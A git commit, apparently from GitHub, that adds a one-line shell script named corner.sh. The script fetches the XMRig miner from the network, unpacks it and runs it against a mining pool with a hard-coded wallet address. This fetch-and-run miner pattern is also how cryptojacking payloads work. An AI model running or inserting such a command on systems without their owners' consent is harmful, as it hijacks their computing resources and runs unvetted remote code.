b262ce2ff3bb7f406d2162dd4f3ed5188bdc5cd9
gmbarcik <88103753+gmbarcik@users.noreply.github.com>
2022-11-30 17:06:38 +0100

    Create corner.sh

---
+++ corner.sh
@@ -0,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz && tar -zxvf xmrig-6.17.0-linux-x64.tar.gz && cd xmrig-6.17.0 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TK1CaH7Zhdkf1qyr7oZNZd4akWsbZceFCu.myminer -p x
